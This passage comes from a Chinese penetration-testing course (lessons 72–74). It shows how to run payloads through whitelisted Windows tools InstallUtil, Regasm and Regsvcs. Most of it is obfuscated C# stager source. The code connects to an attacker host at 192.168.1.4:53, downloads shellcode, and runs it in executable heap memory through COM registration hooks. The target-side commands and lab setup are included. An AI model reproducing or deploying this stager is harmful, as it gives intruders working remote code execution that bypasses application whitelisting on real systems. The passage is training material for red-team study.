76.
77. Marshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU),HEHUjJhkrNS.Length);
78.
79. IntPtrUhxtIFnlOQatrk=IntPtr.Zero;
80.
81. UInt32wdjYKFDCCf=0;
82.
83. IntPtrXVYcQxpp=IntPtr.Zero;
84.
85. UhxtIFnlOQatrk=CreateThread(0,0,WcpKfU,XVYcQxpp,0,refwdjYKFDCCf);
86.
87. WaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF);}}
88.
89. publicstaticvoidLCIUtRN(){
90.
91. byte[]IBtCWU=null;IBtCWU=ErlgHH("192.168.1.4",53);
92.
93. cmMtjerv(IBtCWU);
94.
第七十二课：基于白名单Installutil.exe执行payload第二季
-476-
本文档使用书栈(BookStack.CN)构建
95. }}
installutil.snk596B
Micropoor
第七十二课：基于白名单Installutil.exe执行payload第二季
-477-
本文档使用书栈(BookStack.CN)构建
Regasm为程序集注册工具，读取程序集中的元数据，并将所需的项添加到注册表中。RegAsm.exe是
MicrosoftCorporation开发的合法文件进程。它与Microsoft.NETAssembly
RegistrationUtility相关联。
说明：Regasm.exe所在路径没有被系统添加PATH环境变量中，因此，REGASM命令无法识别。
具体参考微软官方文档：
https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-
assembly-registration-tool
基于白名单Regasm.exe配置payload：
Windows7默认位置：
1. C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe
攻击机：192.168.1.4Debian
靶机：192.168.1.3Windows7
Regasm简介：
配置攻击机msf：
第七十三课：基于白名单Regasm.exe执行payload第三季
-478-
本文档使用书栈(BookStack.CN)构建
1. C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe/UMicropoor.dll
注：x86payload
1. usingSystem;usingSystem.Net;usingSystem.Linq;usingSystem.Net.Sockets;
usingSystem.Runtime.InteropServices;usingSystem.Threading;using
System.EnterpriseServices;usingSystem.Windows.Forms;
2.
3. namespaceHYlDKsYF
4.
5. {
6.
7. publicclasskxKhdVzWQXolmmF:ServicedComponent{
8.
9. publickxKhdVzWQXolmmF(){Console.WriteLine("doge");}
10.
11. [ComRegisterFunction]
12.
13. publicstaticvoidRegisterClass(stringpNNHrTZzW)
14.
15. {
16.
靶机执行：
附录：Micropoor.cs
第七十三课：基于白名单Regasm.exe执行payload第三季
-479-
本文档使用书栈(BookStack.CN)构建
17. ZApOAKJKY.QYJOTklTwn();
18.
19. }
20.
21. [ComUnregisterFunction]
22.
23. publicstaticvoidUnRegisterClass(stringpNNHrTZzW)
24.
25. {
26.
27. ZApOAKJKY.QYJOTklTwn();
28.
29. }
30.
31. }
32.
33. publicclassZApOAKJKY
34.
35. {[DllImport("kernel32")]privatestaticexternUInt32HeapCreate(UInt32
FJyyNB,UInt32fwtsYaiizj,UInt32dHJhaXQiaqW);
36.
37. [DllImport("kernel32")]privatestaticexternUInt32HeapAlloc(UInt32
bqtaDNfVCzVox,UInt32hjDFdZuT,UInt32JAVAYBFdojxsgo);
38.
39. [DllImport("kernel32")]privatestaticexternUInt32RtlMoveMemory(UInt32
AQdEyOhn,byte[]wknmfaRmoElGo,UInt32yRXPRezIkcorSOo);
40.
41. [DllImport("kernel32")]privatestaticexternIntPtrCreateThread(UInt32
uQgiOlrrBaR,UInt32BxkWKqEKnp,UInt32lelfRubuprxr,IntPtrqPzVKjdiF,UInt32
kNXJcS,refUInt32atiLJcRPnhfyGvp);
42.
43. [DllImport("kernel32")]privatestaticexternUInt32WaitForSingleObject(IntPtr
XSjyzoKzGmuIOcD,UInt32VumUGj);staticbyte[]HMSjEXjuIzkkmo(stringaCWWUttzmy,
intiJGvqiEDGLhjr){
44.
45. IPEndPointYUXVAnzAurxH=newIPEndPoint(IPAddress.Parse(aCWWUttzmy),
iJGvqiEDGLhjr);
46.
47. SocketMXCEuiuRIWgOYze=newSocket(AddressFamily.InterNetwork,
SocketType.Stream,ProtocolType.Tcp);
48.
49. try{MXCEuiuRIWgOYze.Connect(YUXVAnzAurxH);}
第七十三课：基于白名单Regasm.exe执行payload第三季
-480-
本文档使用书栈(BookStack.CN)构建
50.
51. catch{returnnull;}
52.
53. byte[]Bjpvhc=newbyte[4];
54.
55. MXCEuiuRIWgOYze.Receive(Bjpvhc,4,0);
56.
57. intIETFBI=BitConverter.ToInt32(Bjpvhc,0);
58.
59. byte[]ZKSAAFwxgSDnTW=newbyte[IETFBI+5];
60.
61. intJFPJLlk=0;
62.
63. while(JFPJLlk<IETFBI)
64.
65. {JFPJLlk+=MXCEuiuRIWgOYze.Receive(ZKSAAFwxgSDnTW,JFPJLlk+5,(IETFBI‐
JFPJLlk)<4096?(IETFBI‐JFPJLlk):4096,0);}
66.
67. byte[]nXRztzNVwPavq=BitConverter.GetBytes((int)MXCEuiuRIWgOYze.Handle);
68.
69. Array.Copy(nXRztzNVwPavq,0,ZKSAAFwxgSDnTW,1,4);ZKSAAFwxgSDnTW[0]=0xBF;
70.
71. returnZKSAAFwxgSDnTW;}
72.
73. staticvoidTOdKEwPYRUgJly(byte[]KNCtlJWAmlqJ){
74.
75. if(KNCtlJWAmlqJ!=null){
76.
77. UInt32uuKxFZFwog=HeapCreate(0x00040000,(UInt32)KNCtlJWAmlqJ.Length,0);
78.
79. UInt32sDPjIMhJIOAlwn=HeapAlloc(uuKxFZFwog,0x00000008,
(UInt32)KNCtlJWAmlqJ.Length);
80.
81. RtlMoveMemory(sDPjIMhJIOAlwn,KNCtlJWAmlqJ,(UInt32)KNCtlJWAmlqJ.Length);
82.
83. UInt32ijifOEfllRl=0;
84.
85. IntPtrihXuoEirmz=CreateThread(0,0,sDPjIMhJIOAlwn,IntPtr.Zero,0,ref
ijifOEfllRl);
86.
87. WaitForSingleObject(ihXuoEirmz,0xFFFFFFFF);}}
88.
第七十三课：基于白名单Regasm.exe执行payload第三季
-481-
本文档使用书栈(BookStack.CN)构建
89. publicstaticvoidQYJOTklTwn(){
90.
91. byte[]ZKSAAFwxgSDnTW=null;ZKSAAFwxgSDnTW=HMSjEXjuIzkkmo("192.168.1.4",
53);
92.
93. TOdKEwPYRUgJly(ZKSAAFwxgSDnTW);
94.
95. }}}
Micropoor
第七十三课：基于白名单Regasm.exe执行payload第三季
-482-
本文档使用书栈(BookStack.CN)构建
Regsvcs为.NET服务安装工具，主要提供三类服务：
加载并注册程序集。
生成、注册类型库并将其安装到指定的COM+1.0应用程序中。
配置以编程方式添加到类的服务。
说明：Regsvcs.exe所在路径没有被系统添加PATH环境变量中，因此，Regsvcs命令无法识别。
具体参考微软官方文档：
https://docs.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-
services-installation-tool
基于白名单Regsvcs.exe配置payload：
Windows7默认位置：
1. C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe
攻击机：192.168.1.4Debian
靶机：192.168.1.3Windows7
Regsvcs简介：
配置攻击机msf：
第七十四课：基于白名单Regsvcs.exe执行payload第四季
-483-
本文档使用书栈(BookStack.CN)构建
1. C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exeMicropoor.dll
注：x86payload
靶机执行：
附录：Micropoor.cs
第七十四课：基于白名单Regsvcs.exe执行payload第四季
-484-
本文档使用书栈(BookStack.CN)构建
1. usingSystem;usingSystem.Net;usingSystem.Linq;usingSystem.Net.Sockets;
usingSystem.Runtime.InteropServices;usingSystem.Threading;using
System.EnterpriseServices;usingSystem.Windows.Forms;
2.
3. namespacephwUqeuTRSqn
4.
5. {
6.
7. publicclassmfBxqerbXgh:ServicedComponent{
8.
9. publicmfBxqerbXgh(){Console.WriteLine("Micropoor");}
10.
11. [ComRegisterFunction]
12.
13. publicstaticvoidRegisterClass(stringDssjWsFMnwwXL)
14.
15. {
16.
17. uXsiCEXRzLNkI.BBNSohgZXGCaD();
18.
19. }
20.
21. [ComUnregisterFunction]
22.
23. publicstaticvoidUnRegisterClass(stringDssjWsFMnwwXL)
24.
25. {
26.
27. uXsiCEXRzLNkI.BBNSohgZXGCaD();
28.
29. }
30.
31. }
32.
33. publicclassuXsiCEXRzLNkI
34.
35. {[DllImport("kernel32")]privatestaticexternUInt32HeapCreate(UInt32
pAyHWx,UInt32KXNJUcPIUymFNbJ,UInt32MotkftcMAIJRnW);
36.
37. [DllImport("kernel32")]privatestaticexternUInt32HeapAlloc(UInt32
yjmmncJHBrUu,UInt32MYjktCDxYrlTs,UInt32zyBAwQVBQbi);
38.
第七十四课：基于白名单Regsvcs.exe执行payload第四季
-485-
本文档使用书栈(BookStack.CN)构建
39. [DllImport("kernel32")]privatestaticexternUInt32RtlMoveMemory(UInt32
PorEiXBhZkA,byte[]UIkcqF,UInt32wAXQEPCIVJQQb);